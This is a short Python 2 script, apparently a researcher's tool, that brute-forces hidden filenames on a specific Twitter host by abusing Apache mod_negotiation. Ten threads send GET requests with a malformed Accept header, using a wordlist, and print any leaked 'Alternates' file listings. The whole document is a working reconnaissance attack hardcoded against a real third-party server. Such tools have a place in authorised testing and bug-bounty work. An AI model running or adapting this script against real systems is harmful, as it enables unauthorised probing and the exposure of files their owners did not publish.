#!/usr/bin/python
# -*- coding: utf-8 -*-
# Twitter Apache mod_negotiation filename bruteforcing tool
# twitter.com/0x94
import httplib
import colorama
import threading
import sys
import os
import Queue
from time import sleep

queue = Queue.Queue()

error = colorama.Fore.RED 
success = colorama.Fore.GREEN 

class calis(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while not queue.empty():
            try:
                key=self.queue.get()
                conn = httplib.HTTPSConnection("dasient.twitter.com")
                conn.putrequest("GET", "/"+key)
                conn.putheader('UserAgent','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
                conn.putheader('Accept','only/0x94')
                conn.endheaders()
                r1 = conn.getresponse()
                if "length" in r1.getheader("alternates"):
                    print success+"Key="+key+"\n"+r1.getheader("alternates")

                self.queue.task_done()
            except Exception as e:
                pass

        sys.exit()
        
        
def main():
    colorama.init(autoreset=True) #windows icin
    oku=open("raw.txt","r").readlines()

    for veri in oku:
        queue.put(veri.rstrip())

    threads = []
    for i in range(10):
        t = calis(queue)
        t.setDaemon(True)
        threads.append(t)
        t.start()

    for tx in threads:
        tx.join()

    print ("Program gorevini yapti")    
    os._exit(1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n' + error + ' Bir tusa basildi.')
        os._exit(1)